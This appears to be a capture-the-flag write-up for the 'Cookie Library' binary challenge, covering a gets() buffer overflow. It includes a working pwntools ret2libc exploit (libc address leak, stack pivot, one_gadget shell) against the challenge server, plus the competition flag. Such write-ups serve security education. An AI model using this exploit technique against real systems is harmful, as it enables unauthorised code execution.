# tjctf: binary

## Cookie Library [90]

Written by KyleForkBomb

_My friend loves cookies. In fact, she loves them so much her favorite cookie changes all the time. She said there's no reward for guessing her favorite cookie, but I still think she's hiding something._

`nc p1.tjctf.org 8010`

## An Exercise in Futility

```sh
$ ./cookie_library
Check out all these cookies!
  - snickerdoodles
  ... (25 lines omitted)
  - white chocolate macadamia nut cookies
Which is the most tasty?
tassies
I'm sorry but we can't be friends anymore
```

Unflattery aside, if we want to guess the right cookie, we'll have to look at the source (minified):

```c
char *cookies[] = {"snickerdoodles", ... };
int main() {
  char s1[76]; // [rsp+0h] [rbp-50h]
  int i; // [rsp+4Ch] [rbp-4h]

  srand(time(0));
  puts("Check out all these cookies!");
  for (i = 0; i <= 27; i++)
    printf("  - %s\n", cookies[i]);
  puts("Which is the most tasty?");
  gets(s1);
  if (!strcasecmp(s1, cookies[rand()%28]))
    puts("Wow, me too!");
  else
    puts("I'm sorry but we can't be friends anymore");
}

Simple enough. We'll use `ctypes` to simulate `rand()`, taking our system's clock as the right seed for `srand()`. Putting it together into a pwntools script:
```python
from pwn import *
from ctypes import CDLL
lib = CDLL('libc.so.6')
lib.srand(lib.time(0))
cookie = lib.rand()%28
r = remote('p1.tjctf.org', 8010)
for i in range(cookie+1): r.recvline()
cookie = r.recvline()[4:-1]
r.sendlineafter('?\n', cookie)
r.interactive()
```
We can test it out, and surely enough, we'll get past the `if()` check:
<p align="center">
<img src="wow.png">
<br><i>Wow.</i>
</p>
If you didn't realise during the CTF, here's the ticket: _that was completely useless_

## _Library_'s in the name

As its namesake, _Cookie Library_ is a `ret2libc` challenge, that unfortunately has no libc version given.

-srand()/rand() is a lie; does nothing
 -can describe how you'd do it with ctypes.CDLL
-gets() BOF -> run gadgets
 -important: rdi (arg1), rsi (arg2), rsp (for 2nd ROP)
-printf %s -> leak address contents
 -"%s" from .rodata, set to rdi
 -address as rsi
 -used to get libc addresses
-gadgets and gets() -> multiple ROPs
 -use scratch space at .data for known-address
 -rdi=.data and gets() to write the ROP
 -rsp gadget to shift to 2nd ROP chain
-libc leak -> one_gadget
 -rsp overwrite has secondary purpose: fulfil one_gadget [rsp+0x40] == NULL requirement
 -ez pwn

<p align="center">
<img src="libcleak.png">
</p>

<p align="center">
<img src="shell.png">
</p>

## flag

`tjctf{c00ki3_yum_yum_mmMmMMmMMmmMm}`

## code

```python
from pwn import *
from sys import argv
r = remote('p1.tjctf.org', 8010)
#constants
e = ELF('./cookie_library.o')
r_offset = cyclic_find('waaa')  #empirical value
pop_rdi = 0x400933      #from ropper or otherwise
pop_rsi_trash = 0x400931
pop_rsp_and_3 = 0x40092d#scratch space
one_gadget = 0x4f322    #$ one_gadget libc-database/db/libc6...
s_fmt = e.symbols['_IO_stdin_used'] + e.section('.rodata').index('%s')
#helper functions
rdi_rsi = lambda rdi, rsi: [pop_rdi, rdi, pop_rsi_trash, rsi, 0]
leak = lambda got_func: rdi_rsi(s_fmt, e.got[got_func]) + [e.plt['printf']]
#add args when running to test this part of the code
if len(argv) > 1: #LEAKED: libc6_2.27-3ubuntu1_amd64 
    rop = leak('rand') + leak('srand')
    r.sendlineafter('?\n', 'a'*r_offset+ ''.join(map(p64,rop)))
    print('addr of rand:  ' + hex(u64(r.recv(6) + '\0'*2))) #0x7fd470c173a0
    r.recvline()
    print('addr of srand: ' + hex(u64(r.recv(6) + '\0'*2))) #0x7fd470c16bb0
else:
    #rop chain 1: get libc addr and write/jmpto a new ropchain
    rop = leak('rand')
    rop+= [pop_rdi, e.symbols['__data_start'], e.symbols['gets']]
    rop+= [pop_rsp_and_3, e.symbols['__data_start']]
    r.sendlineafter('?\n', 'a'*r_offset+ ''.join(map(p64,rop)))
    r.recvline() #trashline
    rand = u64(r.recv(6) + '\0'*2)  #libc of rand()
    one_gadget += rand - 0x443a0
    #rop chain 2: one_gadget, requiring [rsp+0x40] == NULL
    rop2 = [0]*3
    rop2+= [one_gadget]
    r.sendlineafter('\n', ''.join(map(p64,rop2)) + 0x60*'\0')
    r.interactive() #shell
```
